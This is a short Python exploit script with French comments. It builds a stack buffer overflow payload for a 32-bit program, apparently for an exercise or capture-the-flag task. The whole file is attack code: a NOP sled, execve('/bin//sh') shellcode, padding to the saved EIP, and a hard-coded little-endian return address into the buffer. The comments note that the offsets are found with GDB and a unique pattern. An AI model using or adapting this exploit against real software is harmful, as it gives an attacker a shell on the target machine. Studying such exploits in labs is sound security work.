import sys

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# Taille buffer du programme
buffer_size = 1032

# Position d'EIP après le buffer (utiliser pattern unique pour le trouver)
offset_eip = buffer_size + 4

# Offset du buffer dans le programme (utiliser GDB pour le trouver)
offset_buffer = 0x408

# Adresse réelle du buffer
address_buffer = 0xffffcc78 - offset_buffer

# Adresse du buffer en little-endian
buffer_adr = address_buffer.to_bytes(4, byteorder='little')

sys.stdout.buffer.write(b"\x90" * (buffer_size - len(shellcode)) + shellcode + b"\x90" * (offset_eip - buffer_size) + buffer_adr)
